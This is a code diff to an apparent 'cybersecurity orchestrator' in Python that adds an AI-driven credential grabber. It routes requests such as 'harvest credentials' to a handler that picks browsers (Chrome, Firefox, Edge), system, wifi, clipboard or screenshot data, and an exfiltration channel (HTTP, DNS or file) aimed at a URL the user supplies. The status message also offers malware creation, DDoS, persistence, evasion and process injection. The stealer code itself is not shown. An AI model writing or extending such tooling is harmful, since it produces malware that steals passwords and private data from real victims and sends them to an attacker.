@@ -16,6 +16,7 @@ from cybersecurity.advanced_obfuscation import AdvancedObfuscator
 from cybersecurity.malware_builder import MalwareBuilder
 from cybersecurity.advanced_payloads import AdvancedPayloads
 from cybersecurity.ai_malware_generator import AIMalwareGenerator
+from cybersecurity.ai_credential_grabber import AICredentialGrabber
 from mobile_security import iOSTestingTools, AndroidTestingTools
 from security.vulnerability_scanner import VulnerabilityScanner
 from cybersecurity.improvements import ImprovedNLP, EnhancedAuthorization, VSOCReporter
@@ -40,6 +41,7 @@ class EnhancedCybersecurityOrchestrator:
         self.malware_builder = MalwareBuilder()
         self.advanced_payloads = AdvancedPayloads()
         self.ai_malware_generator = AIMalwareGenerator()
+        self.ai_grabber = AICredentialGrabber()
         self.ios_tools = iOSTestingTools()
         self.android_tools = AndroidTestingTools()
         self.vulnerability_scanner = VulnerabilityScanner()
@@ -95,6 +97,11 @@ class EnhancedCybersecurityOrchestrator:
         if any(word in request_lower for word in ["ai generate malware", "ai create malware", "ai make malware", 
                                                    "program malware", "code malware", "write malware"]):
             return self._handle_ai_malware_generation(request)
+        
+        # AI credential grabber
+        if any(word in request_lower for word in ["ai grabber", "credential grabber", "password grabber", 
+                                                   "ai grab", "grab credentials", "harvest credentials"]):
+            return self._handle_ai_grabber(request)
         
         # Build custom malware
         if any(word in request_lower for word in ["build", "create custom", "make", "generate"]):
@@ -389,7 +396,72 @@ class EnhancedCybersecurityOrchestrator:
             return self.base_orchestrator.process(
                 f"{SECURITY_PRIVACY_PROMPT}\n\nUser question: {request}"
             )
-        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, AI malware generation, iOS/Android security tools, scanning, reporting."
+        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, AI malware generation, AI credential grabber, iOS/Android security tools, scanning, reporting."
+    
+    def _handle_ai_grabber(self, request: str) -> str:
+        """Handle AI credential grabber requests"""
+        request_lower = request.lower()
+        
+        # Extract target type
+        target_type = "browser"
+        if "browser" in request_lower:
+            target_type = "browser"
+        elif "system" in request_lower:
+            target_type = "system"
+        elif "wifi" in request_lower:
+            target_type = "wifi"
+        
+        # Extract exfiltration method
+        exfil_method = "http"
+        if "dns" in request_lower:
+            exfil_method = "dns"
+        elif "file" in request_lower:
+            exfil_method = "file"
+        
+        # Extract exfil URL
+        import re
+        url_match = re.search(r'https?://[^\s]+', request)
+        exfil_url = url_match.group() if url_match else None
+        
+        # Extract browsers
+        browsers = []
+        if "chrome" in request_lower:
+            browsers.append("chrome")
+        if "firefox" in request_lower:
+            browsers.append("firefox")
+        if "edge" in request_lower:
+            browsers.append("edge")
+        browsers = browsers or ["chrome", "firefox"]
+        
+        # Extract grab types for system grabber
+        grab_types = []
+        if "wifi" in request_lower:
+            grab_types.append("wifi")
+        if "system" in request_lower or "info" in request_lower:
+            grab_types.append("system")
+        if "clipboard" in request_lower:
+            grab_types.append("clipboard")
+        if "screenshot" in request_lower:
+            grab_types.append("screenshots")
+        grab_types = grab_types or ["wifi", "system", "clipboard"]
+        
+        try:
+            if target_type == "browser":
+                result = self.ai_grabber.create_browser_grabber(browsers, exfil_url)
+                return f"Created browser credential grabber: {result['file']}. Browsers: {', '.join(result['browsers'])}. {result['warning']}"
+            elif target_type == "system":
+                result = self.ai_grabber.create_system_grabber(grab_types)
+                return f"Created system information grabber: {result['file']}. Types: {', '.join(result['grab_types'])}. {result['warning']}"
+            else:
+                # AI-generated grabber
+                description = request
+                result = self.ai_grabber.create_ai_enhanced_grabber(description)
+                if result.get('success'):
+                    return f"Created AI-enhanced grabber: {result['file']}. {result['warning']}"
+                else:
+                    return f"Error: {result.get('error', 'Unknown error')}"
+        except Exception as e:
+            return f"Error creating grabber: {str(e)}"
     
     def _handle_mobile_security(self, request: str) -> str:
         """Handle mobile security testing requests"""
